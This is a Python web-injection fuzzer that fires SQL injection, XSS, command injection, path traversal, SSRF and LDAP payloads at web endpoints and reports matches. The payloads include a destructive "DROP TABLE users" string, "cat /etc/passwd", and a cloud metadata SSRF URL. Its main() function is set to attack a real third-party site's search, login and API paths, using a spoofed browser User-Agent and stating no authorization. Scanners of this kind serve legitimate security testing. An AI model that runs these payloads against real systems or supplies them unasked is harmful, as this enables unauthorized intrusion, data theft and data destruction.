import re
import time
from typing import List, Dict

import requests


class Fuzzer:
    """
    Uses the requests library to detect injection vulnerabilities of a target
    """

    def __init__(self, targetUrl: str, timeout: int = 10):
        self.targetUrl = targetUrl.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # Injection payloads organized by type
        self.payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'/*",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "' AND 1=1--",
                "' AND 1=2--",
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES--",
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5(1))--",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"<script>alert('XSS')</script>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "' onmouseover=alert('XSS') x='",
                "\" onmouseover=alert('XSS') x=\"",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
            ],
            'command_injection': [
                "; ls -la",
                "; whoami",
                "; cat /etc/passwd",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "; id",
                "; uname -a",
                "`whoami`",
                "$(whoami)",
                "; ping -c 10 127.0.0.1",
                "; sleep 10",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32",
                "....//....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd",
                "..%5c..%5c..%5cwindows%5csystem32",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ],
            'ssrf': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:80/",
                "http://0.0.0.0",
            ],
            'ldap_injection': [
                "*",
                "*)(&",
                "*(|(mail=*))",
                "*(|(objectclass=*))",
                ")(uid=*))(|(uid=*",
                "*)(uid=*))(|(uid=*",
            ]
        }

        # Response patterns that might indicate vulnerabilities
        self.vulnerabilityPatterns = {
            'sql_error': [
                r"SQL syntax",
                r"MySQL",
                r"ORA-\d{5}",
                r"PostgreSQL",
                r"Microsoft SQL",
                r"SQLite",
                r"mysql_fetch",
                r"Warning: mysql",
                r"Syntax error",
                r"Unclosed quotation mark",
            ],
            'xss_reflection': [
                r"<script>alert\('XSS'\)</script>",
                r"onerror=alert\('XSS'\)",
                r"onload=alert\('XSS'\)",
            ],
            'command_output': [
                r"root:",
                r"uid=",
                r"gid=",
                r"Windows",
                r"Linux",
                r"Darwin",
            ],
            'path_content': [
                r"root:x:",
                r"daemon:x:",
                r"bin:x:",
            ]
        }

    def testEndpoint(
            self, endpoint: str,
            method: str = 'GET',
            params: Dict | None = None,
            data: Dict | None = None,
            injectionTypes: List[str] | None = None
    ) -> Dict:

        if injectionTypes is None:
            injectionTypes = list(self.payloads.keys())

        fullUrl = f"{self.targetUrl}{endpoint}"
        results = {
            'endpoint': endpoint,
            'method': method,
            'vulnerabilities': [],
            'total_tests': 0,
            'suspicious_responses': []
        }

        for injectionType in injectionTypes:
            if injectionType not in self.payloads:
                continue

            print(f"\n[*] Testing {injectionType} on {endpoint}")

            for payload in self.payloads[injectionType]:
                results['total_tests'] += 1

                testParams = params.copy() if params else {}
                testData = data.copy() if data else {}

                if method == 'GET' and testParams:
                    paramKey = list(testParams.keys())[0]
                    testParams[paramKey] = payload
                elif method == 'POST' and testData:
                    dataKey = list(testData.keys())[0]
                    testData[dataKey] = payload
                elif method == 'GET':
                    testParams = {'input': payload}
                else:
                    testData = {'input': payload}

                try:
                    startTime = time.time()

                    if method == 'GET':
                        response = self.session.get(fullUrl, params=testParams, timeout=self.timeout, allow_redirects=False)
                    else:
                        response = self.session.post(fullUrl, data=testData, timeout=self.timeout, allow_redirects=False)

                    responseTime = time.time() - startTime
                    vulnerabilityInfo = self.analyzeResponse(response, payload, injectionType, responseTime)

                    if vulnerabilityInfo['is_vulnerable']:
                        results['vulnerabilities'].append(vulnerabilityInfo)
                        print(f"[!] POTENTIAL VULNERABILITY: {injectionType}")
                        print(f"    Payload: {payload[:50]}...")
                        print(f"    Indicator: {vulnerabilityInfo['indicator']}")

                    if vulnerabilityInfo['is_suspicious']:
                        results['suspicious_responses'].append(vulnerabilityInfo)
                        print(f"[?] Suspicious response: {injectionType}")
                        print(f"    Payload: {payload[:50]}...")
                        print(f"    Status: {response.status_code}")

                except requests.exceptions.Timeout:
                    print(f"[!] Timeout with payload: {payload[:50]}...")
                    results['vulnerabilities'].append({
                        'type': injectionType,
                        'payload': payload,
                        'indicator': 'timeout',
                        'is_vulnerable': True,
                        'details': 'Request timed out - possible DoS or time-based injection'
                    })
                except requests.exceptions.RequestException as e:
                    print(f"[!] Request error: {str(e)[:50]}...")

        return results

    def analyzeResponse(self, response: requests.Response, payload: str, injectionType: str, responseTime: float) -> Dict:
        result = {
            'type': injectionType,
            'payload': payload,
            'is_vulnerable': False,
            'is_suspicious': False,
            'indicator': None,
            'details': None,
            'status_code': response.status_code,
            'response_time': responseTime
        }

        responseText = response.text.lower()

        # Check for time-based injection (the server has returned a slow response)
        if responseTime > 5:
            result['is_vulnerable'] = True
            result['indicator'] = 'time_delay'
            result['details'] = f'Response took {responseTime:.2f}s'
            return result

        # Check for error patterns based on injection type
        if injectionType == 'sql_injection':
            for pattern in self.vulnerabilityPatterns['sql_error']:
                if re.search(pattern, responseText, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['indicator'] = 'sql_error_message'
                    result['details'] = f'Matched pattern: {pattern}'
                    return result

        elif injectionType == 'xss':
            for pattern in self.vulnerabilityPatterns['xss_reflection']:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['indicator'] = 'xss_reflection'
                    result['details'] = 'Payload reflected in response'
                    return result
            # Also check if payload is reflected
            if payload.lower() in responseText:
                result['is_vulnerable'] = True
                result['indicator'] = 'payload_reflection'
                result['details'] = 'Payload reflected in response'
                return result

        elif injectionType == 'command_injection':
            for pattern in self.vulnerabilityPatterns['command_output']:
                if re.search(pattern, responseText, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['indicator'] = 'command_output'
                    result['details'] = f'Matched pattern: {pattern}'
                    return result

        elif injectionType == 'path_traversal':
            for pattern in self.vulnerabilityPatterns['path_content']:
                if re.search(pattern, responseText, re.IGNORECASE):
                    result['is_vulnerable'] = True
                    result['indicator'] = 'file_content'
                    result['details'] = f'Matched pattern: {pattern}'
                    return result

        # Mark as suspicious if status code is unusual
        if response.status_code >= 400:
            result['is_suspicious'] = True
            result['indicator'] = 'error_status'
            result['details'] = f'HTTP {response.status_code}'

        return result

    def generateReport(self, results: List[Dict]) -> str:
        report = []
        report.append("=" * 70)
        report.append("MANUAL FUZZING REPORT")
        report.append("=" * 70)
        report.append(f"Target: {self.targetUrl}")
        report.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")

        total_vulnerabilities = 0
        total_tests = 0

        for result in results:
            total_tests += result['total_tests']
            report.append(f"\nEndpoint: {result['method']} {result['endpoint']}")
            report.append(f"Tests performed: {result['total_tests']}")
            report.append(f"Vulnerabilities found: {len(result['vulnerabilities'])}")
            report.append(f"Suspicious responses: {len(result['suspicious_responses'])}")

            if result['vulnerabilities']:
                report.append("\n  VULNERABILITIES:")
                for vuln in result['vulnerabilities']:
                    total_vulnerabilities += 1
                    report.append(f"    - Type: {vuln['type']}")
                    report.append(f"      Payload: {vuln['payload'][:60]}...")
                    report.append(f"      Indicator: {vuln['indicator']}")
                    report.append(f"      Details: {vuln['details']}")
                    report.append("")

            if result['suspicious_responses']:
                report.append("\n  SUSPICIOUS RESPONSES:")
                for susp in result['suspicious_responses']:
                    report.append(f"    - Type: {susp['type']}")
                    report.append(f"      Payload: {susp['payload'][:60]}...")
                    report.append(f"      Status: {susp['status_code']}")
                    report.append(f"      Details: {susp['details']}")
                    report.append("")

        report.append("\n" + "=" * 70)
        report.append("SUMMARY")
        report.append("=" * 70)
        report.append(f"Total endpoints tested: {len(results)}")
        report.append(f"Total tests performed: {total_tests}")
        report.append(f"Total potential vulnerabilities: {total_vulnerabilities}")
        report.append("=" * 70)

        return "\n".join(report)


def main():
    """
    Example usage of the ManualFuzzer
    """
    # Step 1: Define your target
    target_url = "https://leader.ir/"  # Replace with your target

    # Step 2: Initialize the fuzzer
    fuzzer = Fuzzer(target_url, timeout=10)

    # Step 3: Define endpoints to test
    test_cases = [
        # GET request with query parameters
        {
            'endpoint': '/search',
            'method': 'GET',
            'params': {'q': 'test'},
            'injection_types': ['sql_injection', 'xss']
        },
        # POST request with form data
        {
            'endpoint': '/login',
            'method': 'POST',
            'data': {'username': 'test', 'password': 'test'},
            'injection_types': ['sql_injection', 'command_injection']
        },
        # GET request without parameters (will add 'input' param)
        {
            'endpoint': '/api/users',
            'method': 'GET',
            'injection_types': ['sql_injection', 'path_traversal', 'ssrf']
        }
    ]

    # Step 4: Run tests
    all_results = []
    for test_case in test_cases:
        result = fuzzer.testEndpoint(
            endpoint=test_case['endpoint'],
            method=test_case['method'],
            params=test_case.get('params'),
            data=test_case.get('data'),
            injectionTypes=test_case.get('injection_types')
        )
        all_results.append(result)

    # Step 5: Generate and print report
    report = fuzzer.generateReport(all_results)
    print(report)

if __name__ == "__main__":
    main()
